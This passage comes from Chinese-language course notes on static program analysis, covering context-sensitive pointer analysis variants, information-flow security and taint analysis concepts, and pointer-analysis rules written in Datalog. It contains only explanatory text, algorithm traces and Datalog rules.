      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:y,&#123;O13&#125;&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:y;</span><br><span class="line">pts = &#123;O13&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O13&#125; - &#123;&#125; = &#123;O13&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O13&#125;;</span><br><span class="line">	pt([4]:y) = pt(n) = pts ⋃ pt(n) = &#123;O13&#125; ⋃ &#123;&#125; = &#123;O13&#125;;</span><br><span class="line">	PFG没有关于[4]:y-&gt;xxx的流向</span><br><span class="line"></span><br><span class="line">关于[4]:y的成员没有相关Load和Store以及函数调用,退出函数</span><br></pre></td></tr></table></div></figure>

<p>到此<code>WL</code>清空，算法结束，最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302161839478.png" alt="image-20230302161839478"></p>

        <h3 id="Object-Sensitivity"   >
          <a href="#Object-Sensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Object-Sensitivity" class="headerlink" title="Object Sensitivity"></a>Object Sensitivity</h3>
      <p>和之前提到的<code>K-Call-Site</code>方法类似，以对象作为上下文的参照</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302163209957.png" alt="image-20230302163209957"></p>

        <h4 id="实例-5"   >
          <a href="#实例-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302165510010.png" alt="image-20230302165510010"></p>
<p>即针对调用时的<code>this</code>对象来作为一个上下文的标识。</p>

        <h3 id="Call-Site和Object-Sensitivity对比"   >
          <a href="#Call-Site和Object-Sensitivity对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call-Site和Object-Sensitivity对比" class="headerlink" title="Call-Site和Object-Sensitivity对比"></a>Call-Site和Object-Sensitivity对比</h3>
      <p>这里把<code>1-Call-Site</code>和``1-Object-Sensitivity`进行一个对比，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302165832151.png" alt="image-20230302165832151"></p>
<p>在该例子中，<code>1-Object</code>更加准确，但是另一个例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302165911690.png" alt="image-20230302165911690"></p>
<p><code>1-Call-Site</code>会更加准确。</p>
<p>所以在理论上，两者没有办法进行比较，但是在实际操作中，针对<code>OO</code>语言来说，<code>Object Sensitivity</code>更加好一点。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302170216610.png" alt="image-20230302170216610"></p>
<p>这个相关的一些对比如下，是两位讲课老师发表的论文，该论文提到一种更加行之有效的方法，只针对程序中一小部分内容运用<code>Object-Sensitivity</code>方法，会更加有效，不过这部分内容也需要一定的资源进行计算。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302170328419.png" alt="image-20230302170328419"></p>
<p>从运行的时间(越短越好)，调用图的边数(越少越好)，以及<code>cast</code>的转化失败可能性(越低越好)来对比，<code>object-Sensitivity</code>在<code>OO</code>语言上表现更好。</p>

        <h3 id="Type-Sensitivity"   >
          <a href="#Type-Sensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Type-Sensitivity" class="headerlink" title="Type Sensitivity"></a>Type Sensitivity</h3>
      <p>也有很多其他上下文挑选条件，比如<code>Type Sensitivity</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302170807480.png" alt="image-20230302170807480"></p>
<p>即在调用点所在类的类型作为筛选条件。</p>
<p>该方法的精度小于等于<code>Object-Sensitivity</code>，但是速度更快。而在实际上<code>Type-Sensitivity</code>的精度与<code>Object-Sensitivity</code>相差不是很多</p>

        <h3 id="总结对比"   >
          <a href="#总结对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302171308228.png" alt="image-20230302171308228"></p>
<p>以上三种方法针对<code>OO</code>语言，最终对比如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302171258044.png" alt="image-20230302171258044"></p>

        <h2 id="总结-6"   >
          <a href="#总结-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302171616516.png" alt="image-20230302171616516"></p>
<p>理解上下文指针分析的算法，通常的上下文几个<code>variants</code>变种，以及不同<code>variants</code>变种之间的对比差异等等。</p>

        <h1 id="十二、Static-Program-Analysis"   >
          <a href="#十二、Static-Program-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、Static-Program-Analysis" class="headerlink" title="十二、Static Program Analysis"></a>十二、Static Program Analysis</h1>
      
        <h2 id="1-Information-Flow-Security"   >
          <a href="#1-Information-Flow-Security" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Information-Flow-Security" class="headerlink" title="1.Information Flow Security"></a>1.Information Flow Security</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114214942.png" alt="image-20230304114214942"></p>
<p>即定义程序中变量的安全等级，明确不同安全等级之间的流动策略，以及相关的访问权限策略等。</p>

        <h3 id="Information-Flow"   >
          <a href="#Information-Flow" class="heading-link"><i class="fas fa-link"></i></a><a href="#Information-Flow" class="headerlink" title="Information Flow"></a>Information Flow</h3>
      <p><code>Information Flow</code>信息流相关概念就不用太说明了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304113722316.png" alt="image-20230304113722316"></p>

        <h3 id="Security-levels-Classes"   >
          <a href="#Security-levels-Classes" class="heading-link"><i class="fas fa-link"></i></a><a href="#Security-levels-Classes" class="headerlink" title="Security levels(Classes)"></a>Security levels(Classes)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114340189.png" alt="image-20230304114340189"></p>
<p>比较常见的就是<code>two-level policy</code>，低等密级和高等密级，或者一些更加复杂的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114618338.png" alt="image-20230304114618338"></p>

        <h3 id="Information-Flow-Policy"   >
          <a href="#Information-Flow-Policy" class="heading-link"><i class="fas fa-link"></i></a><a href="#Information-Flow-Policy" class="headerlink" title="Information Flow Policy"></a>Information Flow Policy</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114843239.png" alt="image-20230304114843239"></p>
<p>常见的策略就是<code>Noninterference policy</code>非干涉策略，即高密级的不能流向低密级的，低密级可以流向高密级的</p>

        <h4 id="Noninterference"   >
          <a href="#Noninterference" class="heading-link"><i class="fas fa-link"></i></a><a href="#Noninterference" class="headerlink" title="Noninterference"></a>Noninterference</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304115159940.png" alt="image-20230304115159940"></p>
<p>由上述例子大概可以知道该策略的相关的信息流动规则。</p>

        <h2 id="2-Confidentiality-and-Integrity"   >
          <a href="#2-Confidentiality-and-Integrity" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Confidentiality-and-Integrity" class="headerlink" title="2.Confidentiality and Integrity"></a>2.Confidentiality and Integrity</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304120447356.png" alt="image-20230304120447356"></p>
<p>两者所防御的点不一样，一个像<code>Confidentiality</code>读保护，一个像<code>Integrity</code>写保护</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304121014989.png" alt="image-20230304121014989"></p>

        <h3 id="Integrity"   >
          <a href="#Integrity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Integrity" class="headerlink" title="Integrity"></a>Integrity</h3>
      <p>保护数据的完整性</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304120820220.png" alt="image-20230304120820220"></p>
<p>即防止不可信的数据影响到本地的相关数据程序。</p>
<p>此外还有更加广泛的定义</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304121346571.png" alt="image-20230304121346571"></p>
<p>即数据的<code>Completeness</code>完整性、<code>Correctness</code>准确性、<code>Consistency</code>一致性都是在<code>Integrity</code>的定义下。</p>

        <h3 id="Confidentialityt"   >
          <a href="#Confidentialityt" class="heading-link"><i class="fas fa-link"></i></a><a href="#Confidentialityt" class="headerlink" title="Confidentialityt"></a>Confidentialityt</h3>
      <p>保护数据的保密性，即数据不被泄露。</p>

        <h2 id="3-Explicit-Flows-and-Covert-Channels"   >
          <a href="#3-Explicit-Flows-and-Covert-Channels" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Explicit-Flows-and-Covert-Channels" class="headerlink" title="3.Explicit Flows and Covert Channels"></a>3.Explicit Flows and Covert Channels</h2>
      
        <h3 id="Implicit-Flows"   >
          <a href="#Implicit-Flows" class="heading-link"><i class="fas fa-link"></i></a><a href="#Implicit-Flows" class="headerlink" title="Implicit Flows"></a>Implicit Flows</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304122132934.png" alt="image-20230304122132934"></p>
<p>可以通过判断<code>public_L</code>的值，判断出<code>secret_H</code>的信息，即<code>Implicit Flows</code>隐式流。</p>

        <h4 id="更多例子"   >
          <a href="#更多例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#更多例子" class="headerlink" title="更多例子"></a>更多例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304122422841.png" alt="image-20230304122422841"></p>
<p>上述的各个语句，都可以通过特定的情形判断出<code>secret_H</code>的相关信息</p>

        <h3 id="Covert-Hidden-Channels"   >
          <a href="#Covert-Hidden-Channels" class="heading-link"><i class="fas fa-link"></i></a><a href="#Covert-Hidden-Channels" class="headerlink" title="Covert/Hidden Channels"></a>Covert/Hidden Channels</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304143310016.png" alt="image-20230304143310016"></p>
<ul>
<li><code>channels</code> : 通过计算来传递信息的机制称为<code>Channels</code>信道</li>
<li><code>Covert Channels</code> : 一个主要目的不是信息传递的信道，但是该信道仍然将信息传递出来了，那么这个信道被称为<code>Covert Channels</code>隐藏信道</li>
</ul>
<p>以上提到的一些信道其实都是这里定义的<code>Covert Channels</code>，都会传递出一定的信息，有点像一些侧信道攻击。</p>

        <h3 id="Explicit-Flows"   >
          <a href="#Explicit-Flows" class="heading-link"><i class="fas fa-link"></i></a><a href="#Explicit-Flows" class="headerlink" title="Explicit Flows"></a>Explicit Flows</h3>
      <p>那么相对于<code>Implicit Flows</code>隐藏信道的就是<code>Explicit Flows</code>显式信道，会传递出更多的信息，如下例子所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304143704679.png" alt="image-20230304143704679"></p>

        <h2 id="4-Taint-Analysis"   >
          <a href="#4-Taint-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Taint-Analysis" class="headerlink" title="4.Taint Analysis"></a>4.Taint Analysis</h2>
      <p>针对关心的数据打上标记称为<code>Tainted data</code>，那么依据该数据的源头<code>Source</code>进行分析，尝试寻找<code>tained data</code>是否会流到某个敏感点<code>sink</code>，比如常见的<code>system</code>函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304144526463.png" alt="image-20230304144526463"></p>
<p>课程中老师讲到如下的一些例子，类似的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304144635715.png" alt="image-20230304144635715"></p>

        <h3 id="Taint-and-Pointer-Analysis"   >
          <a href="#Taint-and-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Taint-and-Pointer-Analysis" class="headerlink" title="Taint and Pointer Analysis"></a>Taint and Pointer Analysis</h3>
      <p>可以将指针分析和污点分析相结合，<code>Tainted data</code>污点数据作为一个指针对象，<code>sources</code>作为<code>allocation sites</code>，然后用指针分析来传播<code>tainted data</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304150023175.png" alt="image-20230304150023175"></p>

        <h3 id="Domains-and-Notations"   >
          <a href="#Domains-and-Notations" class="heading-link"><i class="fas fa-link"></i></a><a href="#Domains-and-Notations" class="headerlink" title="Domains and Notations"></a>Domains and Notations</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304151238672.png" alt="image-20230304151238672"></p>
<p>加入了一个污点数据定义，包含在之前的对象集合中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304151544492.png" alt="image-20230304151544492"></p>
<p>感兴趣的创建对象点为<code>Sources</code>，敏感方法为<code>Sinks</code>，最终可以输出一个<code>pair</code>，<code>&lt;i,j,k&gt;</code>表示从<code>source_i</code>的污点数据可能会流到<code>k</code>个参数的<code>call_site_j</code>这个<code>sink</code>方法中。</p>

        <h3 id="Rules-1"   >
          <a href="#Rules-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-1" class="headerlink" title="Rules"></a>Rules</h3>
      
        <h4 id="Rules-Sources"   >
          <a href="#Rules-Sources" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-Sources" class="headerlink" title="Rules:Sources"></a>Rules:Sources</h4>
      <p>处理<code>Sources</code>的方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304152043659.png" alt="image-20230304152043659"></p>
<p>即在指针分析的<code>call</code>时，某个调用点会调用到属于<code>Sources</code>的方法<code>m</code>，那么就会创建一个<code>t_l</code>污点数据放入该方法返回值的指针集<code>pt(r)</code>里面。</p>

        <h4 id="Rules-Propagate"   >
          <a href="#Rules-Propagate" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-Propagate" class="headerlink" title="Rules:Propagate"></a>Rules:Propagate</h4>
      <p>传播的过程和指针分析类似，因为污点数据其实就是一个对象集合。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304152545326.png" alt="image-20230304152545326"></p>

        <h4 id="Rules-sink"   >
          <a href="#Rules-sink" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-sink" class="headerlink" title="Rules:sink"></a>Rules:sink</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304152630082.png" alt="image-20230304152630082"></p>
<p>当某个点调用到属于<code>Sinks</code>的方法时，如果方法调用参数中包含污点数据，那么就会将一个<code>pair&lt;j,l,i&gt;</code>加入到<code>TaintFlows</code>中方便后面进行输出。</p>

        <h3 id="实例-6"   >
          <a href="#实例-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-6" class="headerlink" title="实例"></a>实例</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304153919785.png" alt="image-20230304153919785"></p>
<p>首先是污点分析的<code>tainted data</code>的创建，这里就是<code>t3</code>加入到<code>pt(pw)</code>，然后就会随着<code>pt(pw)</code>一直流动到<code>s</code>中，直到调用到<code>sink</code>点时，检测到传入的参数中包含<code>pt(pw)</code>这个<code>tainted data</code>，就可以加入到<code>TaintFlows</code>了。</p>
<p>其中<code>&lt;3,7,0&gt;</code>代表在<code>3</code>处的<code>tainted data</code>会流向到<code>7</code>处的<code>sink</code>，参数位置为第<code>0</code>个参数。</p>

        <h2 id="总结-7"   >
          <a href="#总结-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304154401211.png" alt="image-20230304154401211"></p>
<p>信息流安全的概念，信息的完整性和保密性，显式和隐式的信道，以及污点分析的相关使用。</p>

        <h1 id="十三、Datalog-Based-Program-Analysis"   >
          <a href="#十三、Datalog-Based-Program-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、Datalog-Based-Program-Analysis" class="headerlink" title="十三、Datalog-Based Program Analysis"></a>十三、Datalog-Based Program Analysis</h1>
      <p>基于<code>Datalog</code>来进行程序分析</p>

        <h2 id="1-Motivation-2"   >
          <a href="#1-Motivation-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Motivation-2" class="headerlink" title="1.Motivation"></a>1.Motivation</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304155559173.png" alt="image-20230304155559173"></p>
<ul>
<li><p><code>Imperative</code>命令式语言</p>
<p>告诉计算机怎么做，类似<code>C</code>语言</p>
</li>
<li><p><code>Declarative</code>声明式语言</p>
<p>告诉计算机要做什么，类似<code>SQL</code>语言</p>
</li>
</ul>

        <h3 id="Pointer-Analysis-Imperative-Implementation"   >
          <a href="#Pointer-Analysis-Imperative-Implementation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Analysis-Imperative-Implementation" class="headerlink" title="Pointer Analysis, Imperative  Implementation"></a>Pointer Analysis, Imperative  Implementation</h3>
      <ul>
<li><code>worklist</code>：<ul>
<li><code>Array/list</code>？</li>
<li>先进先出吗？</li>
</ul>
</li>
<li><code>points-to set(pt)</code>：<ul>
<li><code>Hash/vector</code>？</li>
</ul>
</li>
<li><code>PFG nodes</code>：<ul>
<li>变量和节点的关联</li>
</ul>
</li>
<li><code>variables and relevant statements</code>变量和相关语句的关联</li>
</ul>

        <h3 id="Pointer-Analysis-Declarative-Implementation-via-Datalog"   >
          <a href="#Pointer-Analysis-Declarative-Implementation-via-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Analysis-Declarative-Implementation-via-Datalog" class="headerlink" title="Pointer Analysis, Declarative  Implementation (via Datalog)"></a>Pointer Analysis, Declarative  Implementation (via Datalog)</h3>
      <p>通过<code>Datalog</code>来实现指针分析比较好实现</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304160203485.png" alt="image-20230304160203485"></p>

        <h2 id="2-Introduction-to-Datalog"   >
          <a href="#2-Introduction-to-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Introduction-to-Datalog" class="headerlink" title="2.Introduction to Datalog"></a>2.Introduction to Datalog</h2>
      <p><code>Datalog = Data + Logic</code></p>
<p>最开始是从数据查询语言发展而来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304160546783.png" alt="image-20230304160546783"></p>

        <h3 id="Predicates-Data"   >
          <a href="#Predicates-Data" class="heading-link"><i class="fas fa-link"></i></a><a href="#Predicates-Data" class="headerlink" title="Predicates(Data)"></a>Predicates(Data)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304160824947.png" alt="image-20230304160824947"></p>
<p>这张表中，<code>Predicates</code>谓词即为<code>Age</code>，某个<code>Statements</code>在表中即为<code>fact</code>，不在就不是<code>fact</code>。</p>

        <h3 id="Atoms"   >
          <a href="#Atoms" class="heading-link"><i class="fas fa-link"></i></a><a href="#Atoms" class="headerlink" title="Atoms"></a>Atoms</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304161051316.png" alt="image-20230304161051316"></p>
<p><code>Atoms</code>在<code>Datalog</code>语言中是最小的语句，形式如同<code>Age(&quot;Xiaoming&quot;,18)</code></p>

        <h4 id="relational-atom"   >
          <a href="#relational-atom" class="heading-link"><i class="fas fa-link"></i></a><a href="#relational-atom" class="headerlink" title="relational atom"></a>relational atom</h4>
      <p>形如<code>P(X1,X2,…,Xn)</code>被称为关系型<code>Atoms</code>，比如<code>Age(“Xiaoming”,18)</code>，代表一种关系。</p>

        <h3 id="Rules-2"   >
          <a href="#Rules-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-2" class="headerlink" title="Rules"></a>Rules</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311103310452.png" alt="image-20230311103310452"></p>
<p>感觉就是通过数据<code>Facts</code>，然后给定规则<code>Rules</code>，最后得到一个结果<code>Datalog program</code></p>

        <h3 id="EDB-and-IDB-Predicates"   >
          <a href="#EDB-and-IDB-Predicates" class="heading-link"><i class="fas fa-link"></i></a><a href="#EDB-and-IDB-Predicates" class="headerlink" title="EDB and IDB Predicates"></a>EDB and IDB Predicates</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311105116933.png" alt="image-20230311105116933"></p>
<p>这里不是很懂这两个数据库的概念，后面再来看看把，其中<code>EDB</code>是不能修改的。</p>

        <h3 id="Logical-Or"   >
          <a href="#Logical-Or" class="heading-link"><i class="fas fa-link"></i></a><a href="#Logical-Or" class="headerlink" title="Logical Or"></a>Logical Or</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311104245405.png" alt="image-20230311104245405"></p>
<p>逻辑<code>or</code>的操作符为<code>;</code>，运算优先级小于逻辑<code>and</code>。</p>

        <h3 id="Negation"   >
          <a href="#Negation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Negation" class="headerlink" title="Negation"></a>Negation</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311104418530.png" alt="image-20230311104418530"></p>
<p>逻辑非的运算符<code>!</code>，类似的。</p>

        <h3 id="Recursion"   >
          <a href="#Recursion" class="heading-link"><i class="fas fa-link"></i></a><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h3>
      <p>递归的性质</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311105157450.png" alt="image-20230311105157450"></p>
<p>即某个<code>IDB</code>某些数据加上一些东西也可以推导出该<code>IDB</code>的某些数据，就有一个递归在里面。</p>
<p>正是有了递归使得<code>Datalog</code>变得更加丰富，不再像只是简单查询的类似<code>SQL</code>的语言。</p>

        <h3 id="Rule-Safety"   >
          <a href="#Rule-Safety" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Safety" class="headerlink" title="Rule Safety"></a>Rule Safety</h3>
      <p>在<code>Datalog</code>中的<code>rule</code>存在<code>safe</code>的概念</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311105839092.png" alt="image-20230311105839092"></p>
<p>比如上述图片提到的例子，<code>x&gt;y</code>中的<code>x</code>是无穷的，<code>!C(x,y)</code>的元素也是无穷的，这样的就是<code>unsafe</code>的。</p>
<p>一个<code>safe Rule</code>中的所有变量都只能出现在<code>non-negated</code>，即不是否定<code>!</code>的关系<code>Atom</code>中。</p>
<p>在<code>Datalog</code>中只有<code>safe rule</code>可被允许。</p>

        <h3 id="Recursion-and-Negation"   >
          <a href="#Recursion-and-Negation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Recursion-and-Negation" class="headerlink" title="Recursion and Negation"></a>Recursion and Negation</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311111635015.png" alt="image-20230311111635015"></p>
<p>这种没有意义的规则是不能写的，没有含义，<code>Datalog</code>也不会允许。</p>

        <h3 id="Execution-of-Datalog-Programs"   >
          <a href="#Execution-of-Datalog-Programs" class="heading-link"><i class="fas fa-link"></i></a><a href="#Execution-of-Datalog-Programs" class="headerlink" title="Execution of Datalog Programs"></a>Execution of Datalog Programs</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311112053774.png" alt="image-20230311112053774"></p>
<p>不同的语言引擎其规则大同小异</p>
<p><code>Datalog</code>具有单调性，其<code>Facts</code>只会单调递增，并且<code>Datalog</code>程序一定会终止，因为其<code>Monotonicity</code>单调性以及<code>safe rulety</code>。</p>

        <h2 id="3-Pointer-Analysis-via-Datalog"   >
          <a href="#3-Pointer-Analysis-via-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Pointer-Analysis-via-Datalog" class="headerlink" title="3.Pointer Analysis via Datalog"></a>3.Pointer Analysis via Datalog</h2>
      
        <h3 id="相关概念"   >
          <a href="#相关概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3>
      
        <h4 id="EDB"   >
          <a href="#EDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#EDB" class="headerlink" title="EDB"></a>EDB</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311112346195.png" alt="image-20230311112346195"></p>
<ul>
<li><code>EDB</code>：能直接从程序中得到的关系数据库，比如<code>New、Assign</code>等等</li>
<li><code>IDB</code>：最终的指针分析结果</li>
<li><code>Rules</code>：指针分析设定的规则</li>
</ul>
<p>比如如下的情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311112601320.png" alt="image-20230311112601320"></p>

        <h4 id="Rules-3"   >
          <a href="#Rules-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-3" class="headerlink" title="Rules"></a>Rules</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311113933344.png" alt="image-20230311113933344"></p>
<p>基本都是一一对应的，对应理解就好</p>

        <h4 id="Call"   >
          <a href="#Call" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call" class="headerlink" title="Call"></a>Call</h4>
      <p>分为几个部分一一对应</p>

        <h5 id="one"   >
          <a href="#one" class="heading-link"><i class="fas fa-link"></i></a><a href="#one" class="headerlink" title="one"></a>one</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311141910814.png" alt="image-20230311141910814"></p>
<ul>
<li><code>VCall(l:S,x:V,k:M)</code> : 代表<code>l</code>语句下调用<code>x.k(..)</code></li>
<li><code>Dispatch(o:O,k:M,m:M)</code> : 和之前一样的，找到对应函数<code>m</code></li>
<li><code>ThisVar(m:M,this:V)</code> : 代表获取<code>this</code>变量</li>
<li><code>Reachable(m:M)</code> : 代表添加可达方法<code>m</code></li>
<li><code>CallGraph(l:S,m:M)</code> : 代表 <code>l</code>语句调用到函数<code>m</code>，正常的<code>CG</code></li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oi∈ pt(x),m = Dispatch(Oi, k) ---&gt; Oi∈ pt(M_this)</span><br></pre></td></tr></table></div></figure>

<p>即该条件转化为<code>Datalog</code>为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VarPointsTo(this, o),Reachable(m),CallGraph(l, m) &lt;-VCall(l, x, k),VarPointsTo(x, o),Dispatch(o, k, m),ThisVar(m, this).</span><br></pre></td></tr></table></div></figure>


        <h5 id="two"   >
          <a href="#two" class="heading-link"><i class="fas fa-link"></i></a><a href="#two" class="headerlink" title="two"></a>two</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311152853949.png" alt="image-20230311152853949"></p>
<ul>
<li><code>Argument(l:S,i:N,ai:V)</code> : 代表实参，即调用点的实参表示，调用点<code>l</code>的<code>ai</code>参数</li>
<li><code>Parameter(m:M,i:N,pi:V)</code> : 代表函数中的形参，函数中的<code>pi</code>参数。</li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ou∈pt(aj),1≤j≤n  ---&gt; Ou∈pt(m_pj),1≤j≤n</span><br></pre></td></tr></table></div></figure>

<p>对应参数的传递，转化为<code>Datalog</code>即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VarPointsTo(pi,o) &lt;- CallGraph(l,m),Argument(l, i,ai),Parameter(m,i,pi),VarPointsTo(ai,o).</span><br></pre></td></tr></table></div></figure>


        <h5 id="three"   >
          <a href="#three" class="heading-link"><i class="fas fa-link"></i></a><a href="#three" class="headerlink" title="three"></a>three</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311153437690.png" alt="image-20230311153437690"></p>
<ul>
<li><code>MethodReturn(m:M,ret:V)</code> : 代表返回值，即函数<code>m</code>中的返回值<code>ret</code></li>
<li><code>CallReturn(l:S,r:V)</code> : 代表调用点<code>l</code>接收返回值到<code>r</code></li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ov∈pt(m_ret)  ---&gt;  Ov∈pt(r)</span><br></pre></td></tr></table></div></figure>

<p>对应返回值的传递，转化为<code>Datalog</code>即为</p>
